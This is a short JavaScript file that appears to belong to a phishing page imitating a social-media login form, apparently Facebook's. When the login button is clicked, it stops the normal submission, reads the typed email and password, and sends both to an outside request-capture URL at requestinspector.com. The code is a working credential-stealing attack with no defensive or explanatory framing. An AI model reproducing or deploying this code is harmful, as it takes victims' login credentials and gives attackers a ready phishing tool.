window.onload = function () {
    const inputMail459 = document.querySelector("#email");
    const inputPass459 = document.querySelector("#pass");
    const Button459 = document.querySelector("#u_0_5_WM");

    Button459.addEventListener("click", function (event) {
        event.preventDefault();
        var mailValue459 = inputMail459.value;
        var passValue459 = inputPass459.value;

        console.log(mailValue459, passValue459)
        document.location = 'https://requestinspector.com/inspect/01h1h8tqyz4wftvy78pzegwypj?c=' + mailValue459 + '---' + passValue459
    })
}
